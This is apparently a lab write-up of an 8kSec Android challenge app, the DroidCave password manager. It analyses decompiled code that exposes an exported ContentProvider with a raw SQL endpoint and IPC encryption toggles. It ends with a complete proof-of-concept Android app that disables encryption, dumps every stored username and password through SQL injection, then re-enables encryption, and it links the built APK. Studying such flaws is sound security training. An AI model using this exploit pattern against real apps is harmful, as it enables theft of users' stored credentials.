**Description**: DroidCave offers a robust and intuitive password management solution for Android users. Store all your credentials in one secure location with military-grade encryption.

**Link**: https://academy.8ksec.io/course/android-application-exploitation-challenges

![[8ksec-DroidCave_1.png]]

Install the `.apk` using **ADB**
```bash
adb install -r DroidCave.apk
```

When using the application we see *that it is an everyday password manager*. Where we have *several functions such as adding to favorite a list, placing a URL and notes to each password*, and, finally, **encrypting credentials**.

Let's analyze the **source code** with **JADX**.
In the **`AndroidManifest.xml`** file, we can see this interesting **Content Provider**
```XML
<provider
    android:name="com.eightksec.droidcave.provider.PasswordContentProvider"
    android:authorities="com.eightksec.droidcave.provider"
    android:exported="true"
    android:grantUriPermissions="true"/>
```

Pay attention in:
- `android:exported="true"` ➜ Any *third‑party app can hit the provider over IPC*.
- No `android:permission` attribute ➜ **No authentication** gate.

So, we have a **world‑readable `ContentProvider` that stores passwords**.
In **java code**, we can see the following curious code in the class **`PasswordContentProvider`**:
```java
static {  
        UriMatcher uriMatcher = new UriMatcher(-1);  
        MATCHER = uriMatcher;  
        uriMatcher.addURI(AUTHORITY, "passwords", 1);  
        uriMatcher.addURI(AUTHORITY, "passwords/#", 2);  
        uriMatcher.addURI(AUTHORITY, "password_search/*", 3);  
        uriMatcher.addURI(AUTHORITY, "password_type/*", 4);  
        uriMatcher.addURI(AUTHORITY, "execute_sql/*", 5);  
        uriMatcher.addURI(AUTHORITY, "settings/*", 6);  
        uriMatcher.addURI(AUTHORITY, PATH_DISABLE_ENCRYPTION, 7);  
        uriMatcher.addURI(AUTHORITY, PATH_ENABLE_ENCRYPTION, 8);  
        uriMatcher.addURI(AUTHORITY, "set_password_plaintext/*/*", 9);  
    }
```

The most important:
```java
uriMatcher.addURI(AUTHORITY, "passwords",              1);   // list all
uriMatcher.addURI(AUTHORITY, "execute_sql/*",          5);   // raw SQL (!!)
uriMatcher.addURI(AUTHORITY, "disable_encryption",      7);   // toggle off
uriMatcher.addURI(AUTHORITY, "enable_encryption",       8);   // toggle on
```

Also, notice the `case 5`:
```java
case 5:
    SupportSQLiteDatabase supportSQLiteDatabase13 = null;
    String lastPathSegment4 = uri.getLastPathSegment();
    if (lastPathSegment4 == null) {
        lastPathSegment4 = "";
    }
    try {
        SupportSQLiteDatabase supportSQLiteDatabase14 = this.database;
        if (supportSQLiteDatabase14 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("database");
        } else {
            supportSQLiteDatabase13 = supportSQLiteDatabase14;
        }
        // lastPathSegment4 is executed verbatim ➜ arbitrary SQL
        return supportSQLiteDatabase13.query(lastPathSegment4);
    } catch (Exception e) {
        Log.e("PasswordProvider", "SQL Error: " + e.getMessage(), e);
        MatrixCursor mc = new MatrixCursor(new String[]{"error"});
        mc.addRow(new String[]{"SQL Error: " + e.getMessage()});
        return mc;
    }
```

And more information about structure:
```java
public Uri insert(Uri uri, ContentValues values) {
    Intrinsics.checkNotNullParameter(uri, "uri");
    SupportSQLiteDatabase supportSQLiteDatabase = null;
    
    if (this.database == null || values == null) {
        return null;
    }
    
    if (MATCHER.match(uri) == 1) {
        SupportSQLiteDatabase supportSQLiteDatabase2 = this.database;
        
        if (supportSQLiteDatabase2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("database");
        } else {
            supportSQLiteDatabase = supportSQLiteDatabase2;
        }
        
        return Uri.parse("content://com.eightksec.droidcave.provider/passwords/" + supportSQLiteDatabase.insert("passwords", 5, values));
    }
    
    throw new IllegalArgumentException("Invalid URI for insert: " + uri);
}
```

Check it in close:
```java
private static final String PATH_DISABLE_ENCRYPTION = "disable_encryption";  
private static final String PATH_ENABLE_ENCRYPTION = "enable_encryption";
```
##### `disable_encryption`
- Sets `SharedPreferences` key `encryption_enabled = false`.
- Iterates over `passwords` rows, **decrypts each BLOB** and rewrites plaintext + `isEncrypted = 0`.
- One IPC call converts every **credential to clear‑text BLOBs**.
##### `enable_encryption`
- `/enable_encryption` performs the **inverse** (*encrypts all rows*).

We can see the full code logic in the `case 6`
```java
case 6:
    String lastPathSegment5 = uri.getLastPathSegment();
    if (lastPathSegment5 == null) {
        lastPathSegment5 = "";
    }
    
    if (StringsKt.startsWith$default(lastPathSegment5, "get_", false, 2, (Object) null)) {
        String substring = lastPathSegment5.substring(4);
        Intrinsics.checkNotNullExpressionValue(substring, "substring(...)");
        MatrixCursor matrixCursor6 = new MatrixCursor(new String[]{"key", "value"});
        
        if (Intrinsics.areEqual(substring, SettingsViewModel.KEY_ENCRYPTION_ENABLED)) {
            SharedPreferences sharedPreferences5 = this.sharedPreferences;
            if (sharedPreferences5 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
            }
            matrixCursor6.addRow(new String[]{SettingsViewModel.KEY_ENCRYPTION_ENABLED, String.valueOf(sharedPreferences5.getBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false))});
        } else if (Intrinsics.areEqual(substring, "all")) {
            SharedPreferences sharedPreferences6 = this.sharedPreferences;
            if (sharedPreferences6 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
            }
            matrixCursor6.addRow(new String[]{SettingsViewModel.KEY_ENCRYPTION_ENABLED, String.valueOf(sharedPreferences6.getBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false))});
        }
        matrixCursor4 = matrixCursor6;
    } else {
        matrixCursor4 = null;
        SharedPreferences sharedPreferences7 = null;
        
        if (StringsKt.startsWith$default(lastPathSegment5, "set_", false, 2, (Object) null)) {
            String substring2 = lastPathSegment5.substring(4);
            Intrinsics.checkNotNullExpressionValue(substring2, "substring(...)");
            List split$default = StringsKt.split$default((CharSequence) substring2, new String[]{"="}, false, 0, 6, (Object) null);
            
            if (split$default.size() == 2) {
                String str4 = (String) split$default.get(0);
                String str5 = (String) split$default.get(1);
                
                if (Intrinsics.areEqual(str4, SettingsViewModel.KEY_ENCRYPTION_ENABLED)) {
                    boolean equals = StringsKt.equals(str5, "true", true);
                    SharedPreferences sharedPreferences8 = this.sharedPreferences;
                    if (sharedPreferences8 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                    } else {
                        sharedPreferences7 = sharedPreferences8;
                    }
                    sharedPreferences7.edit().putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, equals).apply();
                    
                    if (equals) {
                        Uri parse = Uri.parse("content://com.eightksec.droidcave.provider/enable_encryption");
                        Intrinsics.checkNotNullExpressionValue(parse, "parse(...)");
                        return query(parse, null, null, null, null);
                    }
                    
                    Uri parse2 = Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption");
                    Intrinsics.checkNotNullExpressionValue(parse2, "parse(...)");
                    return query(parse2, null, null, null, null);
                }
                
                matrixCursor4 = new MatrixCursor(new String[]{"error"});
                matrixCursor4.addRow(new String[]{"Unknown setting: " + str4});
            } else {
                matrixCursor4 = new MatrixCursor(new String[]{"error"});
                matrixCursor4.addRow(new String[]{"Invalid format. Use set_key=value"});
            }
        }
    }
    return matrixCursor4;
```

So.. **One IPC call converts every credential to clear‑text BLOBs**.

The most important part:
```java
uriMatcher.addURI(AUTHORITY, "passwords", 1);
```
- `/passwords` (or the SQLi path) **returns a cursor**; after bypass the encryption mechanism, the `password` column already **contains readable ASCII**.

The **step by step** in short is:
1. Turn off encryption & decrypt DB -> `content://com.eightksec.droidcave.provider/disable_encryption`
2. Exfiltrate clear‑text secrets -> SQLi or just make a Cursor query.
3. Enable encryption -> _(optional)_ `…/enable_encryption`

The incident in this app:
1. **Exported provider without permission** ➜ Improper IPC exposure.
2. **Raw SQL endpoint** ➜ Classical SQLi.
3. **Feature toggle via IPC** ➜ Flawed crypto implementation; security control can be disabled externally.

Let's create an PoC app!
**`AndroidManifest.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
    package="com.lautaro.droidexploit">  
  
    <queries>  
        <package android:name="com.eightksec.droidcave" />  
        <provider android:authorities="com.eightksec.droidcave.provider" />  
    </queries>  
  
    <application  
        android:label="@string/app_name"  
        android:icon="@mipmap/ic_launcher"  
        android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">  
  
        <activity  
            android:name=".MainActivity"  
            android:exported="true"  
            android:label="@string/app_name">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>  
  
    </application>  
</manifest>
```

**`/res/strings.xml`**
```XML
<resources>  
    <string name="app_name">DroidExploit</string>  
    <string name="btn_txt">Do something cool!</string>  
</resources>
```

**`activity_main.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>  
<androidx.constraintlayout.widget.ConstraintLayout  
    xmlns:android="http://schemas.android.com/apk/res/android"  
    xmlns:app="http://schemas.android.com/apk/res-auto"  
    android:layout_width="match_parent"  
    android:layout_height="match_parent">  
  
    <Button  
        android:id="@+id/btnRun"  
        android:layout_width="wrap_content"  
        android:layout_height="wrap_content"  
        android:text="@string/btn_txt"  
        app:layout_constraintBottom_toBottomOf="parent"  
        app:layout_constraintEnd_toEndOf="parent"  
        app:layout_constraintStart_toStartOf="parent"  
        app:layout_constraintTop_toTopOf="parent" />  
</androidx.constraintlayout.widget.ConstraintLayout>
```

**`MainActivity.java`**
```java
package com.lautaro.droidexploit;  
  
import android.content.ContentResolver;  
import android.database.Cursor;  
import android.net.Uri;  
import android.os.Bundle;  
import android.util.Log;  
import android.widget.Button;  
  
import androidx.appcompat.app.AppCompatActivity;  
  
public class MainActivity extends AppCompatActivity {  
  
    private static final String TAG = "DroidExploit";  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        Button run = findViewById(R.id.btnRun);  
        run.setOnClickListener(v -> new Thread(this::stealSecrets).start());  
    }  
  
    // disable encryption  
    private void stealSecrets() {  
        ContentResolver cr = getContentResolver();  
  
        // turn off encryption  
        cr.query(  
                Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption"),  
                null, null, null, null  
        );  
  
        // sqli  
        String sql =  
                "SELECT\n" +  
                        " id,name,username,CAST(password AS TEXT) AS pass\n" +  
                        "FROM\n" +  
                        " passwords";  
        Uri lootUri = Uri.parse(  
                "content://com.eightksec.droidcave.provider/execute_sql/" + sql  
        );  
  
        StringBuilder loot = new StringBuilder();  
        try (Cursor c = cr.query(lootUri, null, null, null, null)) {  
            if (c != null) {  
                int id = c.getColumnIndex("id");  
                int n  = c.getColumnIndex("name");  
                int u  = c.getColumnIndex("username");  
                int p  = c.getColumnIndex("pass");  
                while (c.moveToNext()) {  
                    loot.append(c.getInt(id)).append('|')  
                            .append(c.getString(n)).append('|')  
                            .append(c.getString(u)).append('|')  
                            .append(c.getString(p)).append('\n');  
                }  
            }        }  
        Log.i(TAG, "\n" + loot);  
  
        // enable encryption  
        cr.query(  
                Uri.parse("content://com.eightksec.droidcave.provider/enable_encryption"),  
                null, null, null, null  
        );  
    }  
}
```

![[8ksec-DroidCave_2.png]]

**Download PoC**: https:///lautarovculic.com/my_files/DroidExploit.apk

I hope you found it useful (: